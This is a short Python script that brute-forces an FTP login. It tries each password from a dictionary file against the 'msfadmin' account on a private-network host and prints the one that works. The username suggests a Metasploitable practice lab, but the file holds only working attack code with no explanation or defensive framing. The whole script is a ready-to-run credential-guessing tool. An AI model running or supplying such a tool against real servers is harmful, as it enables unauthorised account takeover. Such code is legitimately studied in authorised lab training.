import ftplib

host = '192.168.46.145'

#1 - open a dic file
# 2 - read line by line
#3- call ftpconnect
#4- if retrun true I get the pssword


def ftpconnect(password):    # take 1 arr  

    client=ftplib.FTP("192.168.46.145")
    try:
        client.login('msfadmin',password)

    except ftplib.error_perm:
        return False
    else:
        return True


f=open('password.dic','r')
for word in f:
    print("trying password %s ..." %word)
    if ftpconnect(word.strip()):
        print("password found: ", word)
        f.close()
        exit(0)
print("Password not found in your dictionnary")
f.close()

